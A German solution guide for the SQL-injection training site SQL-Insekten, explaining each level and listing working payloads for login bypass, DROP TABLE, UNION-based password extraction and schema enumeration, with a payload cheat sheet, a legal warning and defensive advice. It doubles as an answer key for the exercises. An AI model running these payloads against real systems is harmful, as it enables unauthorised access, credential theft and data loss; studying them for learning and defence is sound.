# SQL-Insekten: Vollständige Lösungsanleitung

## Einführung

SQL-Insekten (https://www.sql-insekten.de) ist eine Lernplattform für SQL-Injection-Angriffe. Diese Dokumentation bietet eine systematische Anleitung zur Lösung aller Aufgaben und erklärt die zugrundeliegenden Techniken.

## Grundlagen der SQL-Injektion

### Was ist eine SQL-Injektion?

Eine SQL-Injektion ist eine Schwachstelle, bei der Angreifer durch manipulierte Eingaben in Formularfelder eigene SQL-Befehle einschleusen können. Dies ermöglicht es, Daten auszulesen, zu verändern oder zu löschen.

### Typische verwundbare Implementierung

```sql
SELECT benutzername FROM benutzer 
WHERE benutzername = 'EINGABE' AND passwort = 'MD5(PASSWORT)';
```

## Grundlegende Techniken

### 1. Authentifizierung umgehen

**Ziel:** Login ohne gültige Zugangsdaten

**Technik:** OR-Bedingung immer wahr machen

**Payload:**
```
' OR '1'='1' --
```

**Erklärung:**
- `'` schließt den ursprünglichen String
- `OR '1'='1'` macht die Bedingung immer wahr
- `--` kommentiert den Rest der Query aus

**Resultierende Query:**
```sql
SELECT benutzername FROM benutzer 
WHERE benutzername = '' OR '1'='1' --' AND passwort = '...';
```

### 2. Gezielter Login

**Ziel:** Als bestimmter Benutzer einloggen

**Payload:**
```
alexamusterfrau' --
```

**Erklärung:**
- Nutzt einen bekannten Benutzernamen
- `'` schließt den String
- `--` kommentiert die Passwortprüfung aus

### 3. Tabelle löschen

**Ziel:** Eine Tabelle per SQL-Injektion droppen

**Payload:**
```
'; DROP TABLE benutzer; --
```

**Erklärung:**
- `'` schließt den String
- `;` beendet die aktuelle Query
- `DROP TABLE benutzer` löscht die Tabelle
- `--` kommentiert den Rest aus

## Erweiterte Techniken

### 4. UNION SELECT für Datenextraktion

**Ziel:** Daten aus anderen Tabellen auslesen

**Grundprinzip:**
```
' UNION SELECT spalte1, spalte2 FROM tabelle --
```

**Beispiel - Alle Benutzernamen und Passwörter:**
```
' UNION SELECT benutzername, passwort FROM benutzer --
```

**Wichtige Regeln:**
- Spaltenanzahl muss identisch sein
- Datentypen sollten kompatibel sein
- Mit `NULL` auffüllen, wenn nötig

### 5. Metadaten-Abfrage

**Ziel:** Tabellenstruktur herausfinden

**Für MySQL/PostgreSQL/SQL Server:**
```
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**Spaltennamen ermitteln:**
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='benutzer' --
```

### 6. Spalten-Aliasing

**Ziel:** Daten aus anderen Tabellen als "Benutzername" anzeigen

**Beispiel - Lohn von Greta Maria:**
```
' UNION SELECT lohn AS benutzername FROM mitarbeiter WHERE vorname = 'Greta Maria' --
```

## Level-spezifische Lösungen

### Level 1-5: Grundlegende Authentifizierung

**Problem:** Klassische Login-Formulare
**Lösung:** `' OR '1'='1' --` oder gezielter Login

### Level 6: Eingeschränkte Ergebnisse

**Problem:** Nur eine Zeile darf zurückgegeben werden
**Lösung:** Gezielter Login mit bekanntem Benutzernamen
```
alexamusterfrau' --
```

### Level 7: Produktsuche

**Problem:** Suche nach Schuhen der Marke 'Nicke'
**Lösung:** Einfache Eingabe ohne Injektion
```
Nicke
```

### Level 8: Datenextraktion

**Problem:** Alle Benutzernamen und Passwörter ausgeben
**Lösung:** UNION SELECT
```
' UNION SELECT benutzername, passwort FROM benutzer --
```

### Level 9: Metadaten-Abfrage

**Problem:** Spalten der Tabelle 'kunden' herausfinden
**Lösung:** Information Schema nutzen
```
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'kunden' --
```

### Level 10: URL-basierte Injektionen

**Problem:** Parameter in URL manipulieren
**Lösung:** Direkte Manipulation der URL
```
https://example.com/index.php?produkt_id=1
```

### Level 11: Gezielte Datenabfrage

**Problem:** Name, E-Mail und Adresse für kunden_id = 3
**Lösung:** UNION SELECT mit genau 3 Spalten
```
3 UNION SELECT name, email, adresse FROM kunden WHERE kunden_id=3 --
```

**URL-codiert:**
```
3%20UNION%20SELECT%20name,%20email,%20adresse%20FROM%20kunden%20WHERE%20kunden_id=3%20--
```

## Häufige Probleme und Lösungen

### Problem: Spaltenanzahl stimmt nicht überein

**Symptom:** Fehler "The used SELECT statements have a different number of columns"

**Lösung:** Spaltenanzahl anpassen mit NULL-Werten
```
' UNION SELECT spalte1, NULL, NULL FROM tabelle --
```

### Problem: Semikolon nicht erlaubt

**Symptom:** Semikolons werden gefiltert

**Lösung:** Nur UNION verwenden, keine zusätzlichen Statements
```
' UNION SELECT spalte1, spalte2 FROM tabelle --
```

### Problem: Nur eine Zeile erlaubt

**Symptom:** Mehrere Ergebnisse werden abgelehnt

**Lösung:** Gezielte WHERE-Bedingung verwenden
```
' UNION SELECT spalte1 FROM tabelle WHERE bedingung --
```

### Problem: URL-Encoding

**Symptom:** Sonderzeichen funktionieren nicht in URLs

**Lösung:** Proper URL-Encoding verwenden
- Leerzeichen: `%20`
- Apostroph: `%27`
- Komma: `,` (meist nicht nötig)

## Best Practices für SQL-Injektionen

### 1. Systematisches Vorgehen

1. **Schwachstelle identifizieren:** Wo werden Eingaben ungefiltert verwendet?
2. **Syntax verstehen:** Wie sieht die ursprüngliche Query aus?
3. **Payload anpassen:** Spaltenanzahl und -typen beachten
4. **Testen und iterieren:** Schrittweise komplexere Payloads versuchen

### 2. Wichtige Payloads

**Authentifizierung umgehen:**
```
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1" --
```

**Datenextraktion:**
```
' UNION SELECT spalte1, spalte2 FROM tabelle --
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**URL-basiert:**
```
?parameter=wert%20UNION%20SELECT%20spalte1,%20spalte2%20FROM%20tabelle%20--
```

### 3. Debugging-Tipps

- **Schrittweise vorgehen:** Erst einfache Payloads, dann komplexere
- **Fehlermeldungen nutzen:** Oft geben sie Hinweise auf die Datenbankstruktur
- **Spaltenanzahl ermitteln:** Mit ORDER BY-Klausel testen
- **Kommentare verwenden:** `--` oder `/* */` für Zeilenende

## Sicherheitshinweise

### Nur zu Lernzwecken!

Diese Techniken dürfen **nur** in kontrollierten Lernumgebungen wie SQL-Insekten verwendet werden. Der Einsatz in produktiven Systemen ist:
- **Illegal**
- **Strafbar**
- **Ethisch verwerflich**

### Defensive Programmierung

Zum Schutz vor SQL-Injektionen sollten Entwickler:
- **Prepared Statements** verwenden
- **Input-Validierung** implementieren
- **Least-Privilege-Prinzip** befolgen
- **Regelmäßige Sicherheitstests** durchführen

## Troubleshooting

### Häufige Fehlermeldungen

**"Column count doesn't match"**
- Spaltenanzahl im UNION SELECT anpassen

**"Syntax error"**
- Anführungszeichen oder Kommentare prüfen

**"Access denied"**
- Benutzerrechte könnten eingeschränkt sein

**"Table doesn't exist"**
- Tabellennamen prüfen (case-sensitive)

### Debugging-Strategien

1. **Einzelne Komponenten testen**
2. **Fehlermeldungen analysieren**
3. **Schrittweise Komplexität erhöhen**
4. **Alternative Syntax versuchen**

## Zusammenfassung

SQL-Injektionen sind eine mächtige Angriffstechnik, die durch unsichere Programmierung entstehen. Mit systematischem Vorgehen und den richtigen Techniken lassen sich die meisten Aufgaben lösen:

1. **Grundlagen verstehen:** Wie funktionieren SQL-Queries?
2. **Techniken beherrschen:** OR-Bedingungen, UNION SELECT, Kommentare
3. **Systematisch vorgehen:** Von einfach zu komplex
4. **Verantwortlich handeln:** Nur zu Lernzwecken einsetzen

Diese Dokumentation bietet eine solide Grundlage für das Lösen aller SQL-Insekten-Aufgaben und das Verständnis der zugrundeliegenden Sicherheitsprobleme.

---

*Erstellt: Juli 2025*  
*Quelle: https://www.sql-insekten.de*